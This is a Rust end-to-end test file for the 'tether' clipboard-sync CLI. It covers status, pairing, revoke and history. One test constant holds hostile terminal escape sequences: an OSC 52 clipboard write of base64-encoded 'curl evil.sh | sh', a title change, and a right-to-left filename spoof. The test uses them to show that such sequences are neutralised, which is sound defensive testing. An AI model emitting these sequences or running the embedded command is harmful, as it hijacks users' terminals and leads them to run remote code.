//! End-to-end tests of the `tether` CLI against real daemons. The commands
//! run in-process (`tether_cli::run`) with captured output, talking to the
//! daemons over the real control channel.
//! Threat model: docs/SECURITY.md, "`tether` CLI".

mod common;

use std::io::{Cursor, Write};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use clap::Parser;
use common::{pair, Control, Daemon};
use tether_cli::{run, Cli, Target};

/// Run `tether ARGS` against the daemon behind `ctl`, answering prompts with `input`.
async fn tether(ctl: &Control, args: &[&str], input: &str) -> anyhow::Result<String> {
    let cli = Cli::try_parse_from(std::iter::once("tether").chain(args.iter().copied()))?;
    let target = Target { endpoint: ctl.endpoint.clone(), token: ctl.token.clone() };
    let mut out = Vec::new();
    run(cli.command, &target, &mut out, &mut Cursor::new(input.as_bytes().to_vec())).await?;
    Ok(String::from_utf8(out)?)
}

/// Output that a test can read while the command is still running.
#[derive(Clone, Default)]
struct Shared(Arc<Mutex<Vec<u8>>>);

impl Write for Shared {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

impl Shared {
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.0.lock().unwrap()).to_string()
    }
}

/// Start `tether ARGS` in the background, writing into the returned buffer.
fn spawn_tether(ctl: &Control, args: &[&str]) -> (Shared, tokio::task::JoinHandle<anyhow::Result<()>>) {
    let cli = Cli::try_parse_from(std::iter::once("tether").chain(args.iter().copied())).unwrap();
    let target = Target { endpoint: ctl.endpoint.clone(), token: ctl.token.clone() };
    let out = Shared::default();
    let mut w = out.clone();
    let task = tokio::spawn(async move { run(cli.command, &target, &mut w, &mut Cursor::new(Vec::new())).await });
    (out, task)
}

async fn wait_until(what: &str, mut ok: impl FnMut() -> bool) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while !ok() {
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

const HOSTILE: &str =
    "invoice \u{1b}]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u{7}\u{1b}[2J\u{1b}]0;pwned\u{7} total\u{202E}fdp.exe";

fn assert_inert(output: &str) {
    for bad in ['\u{1b}', '\u{7}', '\u{202E}', '\u{9b}'] {
        assert!(!output.contains(bad), "{bad:?} reached the terminal:\n{output:?}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn status_and_devices_describe_this_device() {
    let (d, ctl) = Daemon::with_control("alpha");
    let status = tether(&ctl, &["status"], "").await.unwrap();
    assert!(status.contains(&d.id) && status.contains("Pairing      closed"), "{status}");
    let devices = tether(&ctl, &["devices"], "").await.unwrap();
    assert!(devices.contains(&d.id[..12]) && devices.contains("this device"), "{devices}");
    let history = tether(&ctl, &["history"], "").await.unwrap();
    assert_eq!(history.trim(), "No clipboard history yet.");
}

#[tokio::test(flavor = "multi_thread")]
async fn escape_sequences_from_a_peer_never_reach_the_terminal() {
    let (mut a, ctl_a) = Daemon::with_control("alpha");
    let (mut b, _ctl_b) = Daemon::with_control("bravo");
    pair(&mut a, &mut b);

    let (watched, watch) = spawn_tether(&ctl_a, &["watch", "--count", "1"]);
    tokio::time::sleep(Duration::from_millis(500)).await; // let the subscription start
    b.send(HOSTILE);
    tokio::time::timeout(Duration::from_secs(10), watch).await.expect("watch sees the copy").unwrap().unwrap();
    let watched = watched.text();
    assert!(watched.contains("invoice") && watched.contains("[held: hides control characters]"), "{watched}");
    assert_inert(&watched);

    for args in [&["history"][..], &["history", "--full"]] {
        let shown = tether(&ctl_a, args, "").await.unwrap();
        assert!(shown.contains("invoice") && shown.contains("␛]52"), "{args:?}: {shown}");
        assert_inert(&shown);
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn pair_join_and_revoke_through_the_cli() {
    let (_a, ctl_a) = Daemon::with_control("alpha");
    let (b, ctl_b) = Daemon::with_control("bravo");

    // `tether pair` prints a code and waits; `tether join` on the other device completes it.
    let (paired, waiting) = spawn_tether(&ctl_a, &["pair"]);
    wait_until("a pairing code", || paired.text().contains("Waiting")).await;
    let code = paired.text().lines().find_map(|l| l.strip_prefix("Pairing code: ")).unwrap().to_string();
    let status = tether(&ctl_a, &["status"], "").await.unwrap();
    assert!(status.contains("Pairing      open"), "{status}");
    let port = status.lines().find_map(|l| l.strip_prefix("Network      UDP port ")).unwrap().trim().to_string();
    let joined = tether(&ctl_b, &["join", &code, &format!("127.0.0.1:{port}")], "").await.unwrap();
    assert!(joined.starts_with("Paired with"), "{joined}");
    tokio::time::timeout(Duration::from_secs(10), waiting).await.expect("pair returns").unwrap().unwrap();
    assert!(paired.text().contains(&format!("Paired with bravo ({})", &b.id[..12])), "{}", paired.text());

    // Revoke asks first; "n" keeps the device.
    let prefix = &b.id[..8];
    let kept = tether(&ctl_a, &["revoke", prefix], "n\n").await.unwrap();
    assert!(kept.contains("[y/N]") && kept.contains("Not revoked."), "{kept}");
    assert!(!tether(&ctl_a, &["devices"], "").await.unwrap().contains("revoked"));

    let gone = tether(&ctl_a, &["revoke", prefix], "y\n").await.unwrap();
    assert!(gone.contains("Revoked bravo"), "{gone}");
    let devices = tether(&ctl_a, &["devices"], "").await.unwrap();
    assert!(devices.lines().any(|l| l.starts_with(&b.id[..12]) && l.ends_with("revoked")), "{devices}");

    // Refusals: this device, an already-revoked device, too short a prefix.
    let me = tether(&ctl_a, &["status"], "").await.unwrap();
    let my_id = me.split_whitespace().find(|w| w.len() == 64).unwrap().to_string();
    let e = tether(&ctl_a, &["revoke", &my_id[..10], "--yes"], "").await.unwrap_err();
    assert!(e.to_string().contains("that is this device"), "{e}");
    let e = tether(&ctl_a, &["revoke", prefix, "--yes"], "").await.unwrap_err();
    assert!(e.to_string().contains("already revoked"), "{e}");
    assert!(tether(&ctl_a, &["revoke", "ab"], "").await.is_err());
}

#[tokio::test(flavor = "multi_thread")]
async fn history_pages_past_the_daemon_page_size() {
    let (mut d, ctl) = Daemon::with_control("alpha");
    for i in 0..105 {
        d.send(&format!("item {i:03}"));
    }
    let deadline = Instant::now() + Duration::from_secs(15);
    let shown = loop {
        let shown = tether(&ctl, &["history", "-n", "1000"], "").await.unwrap();
        if shown.lines().count() >= 105 || Instant::now() > deadline {
            break shown;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    };
    let lines: Vec<&str> = shown.lines().collect();
    assert_eq!(lines.len(), 105, "{shown}");
    assert!(lines[0].ends_with("item 104") && lines[104].ends_with("item 000"), "{shown}");
    let three = tether(&ctl, &["history", "-n", "3"], "").await.unwrap();
    assert_eq!(three.lines().count(), 3);
}
